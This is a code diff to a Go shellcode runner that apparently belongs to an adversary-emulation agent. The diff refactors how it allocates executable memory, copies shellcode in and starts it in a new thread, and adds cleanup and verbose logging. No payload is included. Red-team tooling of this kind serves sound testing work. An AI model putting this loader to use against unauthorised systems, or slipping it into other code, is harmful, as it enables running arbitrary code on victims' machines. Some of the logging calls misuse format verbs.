@@ -7,43 +7,72 @@ import (
 	"syscall"
 	"unsafe"
 
-	"github.com/mitre/gocat/execute"
-)
+    "golang.org/x/sys/windows"
 
-const (
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
-	PAGE_EXECUTE_READWRITE = 0x40
+	"github.com/mitre/gocat/execute"
+    "github.com/mitre/gocat/output"
 )
 
 var (
-	hKernel32      *syscall.DLL
-	hNtdll         *syscall.DLL
-	fpVirtualAlloc  *syscall.Proc
+	hKernel32       *syscall.DLL
+	hNtdll          *syscall.DLL
 	fpRtlCopyMemory *syscall.Proc
 	fpCreateThread  *syscall.Proc
 )
 
 // Runner runner
 func Runner(shellcode []byte) (bool, string) {
-	address, _, err := fpVirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    // Allocate and populate RWX buffer for shellcode
+    output.VerbosePrint("[*] Creating shellcode buffer")
+	address, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	if checkErrorMessage(err) {
 		return false, execute.ERROR_PID
 	}
+
+    output.VerbosePrint("[*] Populating shellcode buffer")
 	_, _, err = fpRtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	if checkErrorMessage(err) {
 		return false, execute.ERROR_PID
 	}
 
-	// Run shellcode in new thread
-	hThread, _, err := fpCreateThread.Call(0, 0, address, 0, 0, 0)
-	if checkErrorMessage(err) {
-		return false, execute.ERROR_PID
-	}
-	if (hThread == 0) {
-		println("[!] CreateThread returned a null handle.")
-		return false, execute.ERROR_PID
-	}
+    // Run shellcode in new thread
+    output.VerbosePrint("[*] Running shellcode in new thread")
+    hThread, _, err := fpCreateThread.Call(0, 0, address, 0, 0, 0)
+    if checkErrorMessage(err) {
+        return false, execute.ERROR_PID
+    }
+    if (hThread == 0) {
+        output.VerbosePrint("[!] CreateThread returned a null handle.")
+        return false, execute.ERROR_PID
+    }
+
+    // Run auxiliary go routine to wait for shellcode completion and perform cleanup
+    go func() {
+        defer func() {
+            if result := recover(); result != nil {
+                output.VerbosePrint(fmt.Sprintf("Auxiliary routine panicked: %s", result))
+            }
+        }()
+
+        // Wait for shellcode to finish executing
+        output.VerbosePrint("[*] Waiting for thread completion")
+        waitResult, waitErr := windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
+        _ = windows.CloseHandle(windows.Handle(hThread))
+        if checkErrorMessage(waitErr) {
+            return
+        } else if waitResult != windows.WAIT_OBJECT_0 {
+            output.VerbosePrint(fmt.Sprintf("[!] WaitForSingleObject failed. Return value: %d", waitResult))
+            return
+        }
+
+        // Free memory
+        output.VerbosePrint("[*] Freeing buffer")
+        err := windows.VirtualFree(address, 0, windows.MEM_RELEASE)
+        if err != nil {
+    		output.VerbosePrint(fmt.Sprintf("[!] Failed to free buffer: %s", err.Error()))
+    	}
+    }()
+
 	return true, execute.SUCCESS_PID
 }
 
@@ -51,33 +80,29 @@ func Runner(shellcode []byte) (bool, string) {
 func IsAvailable() bool {
 	var err error
 	if hKernel32, err = syscall.LoadDLL("kernel32.dll"); err != nil {
-		fmt.Printf("[-] Failed to load Kernel32: %s", err.Error())
+		fmt.Println("[-] Failed to load Kernel32: %s", err.Error())
 		return false
 	}
 	if hNtdll, err = syscall.LoadDLL("ntdll.dll"); err != nil {
-		fmt.Printf("[!] Failed to load NTDLL: %s", err.Error())
+		fmt.Println("[!] Failed to load NTDLL: %s", err.Error())
 		return false
 	}
-	if fpVirtualAlloc, err = hKernel32.FindProc("VirtualAlloc"); err != nil {
-		fmt.Printf("[-] Failed to load VirtualAlloc API: %s", err.Error())
+    if fpCreateThread, err = hKernel32.FindProc("CreateThread"); err != nil {
+		fmt.Println("[-] Failed to load CreateThread API: %s", err.Error())
 		return false
 	}
 	if fpRtlCopyMemory, err = hNtdll.FindProc("RtlCopyMemory"); err != nil {
-		fmt.Printf("[-] Failed to load RtlCopyMemory API: %s", err.Error())
-	}
-	if fpCreateThread, err = hKernel32.FindProc("CreateThread"); err != nil {
-		fmt.Printf("[-] Failed to load CreateThread API: %s", err.Error())
-		return false
+		fmt.Println("[-] Failed to load RtlCopyMemory API: %s", err.Error())
 	}
 
-	fmt.Printf("[+] Fetched required APIs for shellcode runner.")
+	fmt.Println("[+] Fetched required APIs for shellcode runner.")
 	return true
 }
 
 // Check for error message
 func checkErrorMessage(err error) bool {
 	if err != nil && err.Error() != "The operation completed successfully." {
-		println(err.Error())
+		output.VerbosePrint(err.Error())
 		return true
 	}
 	return false
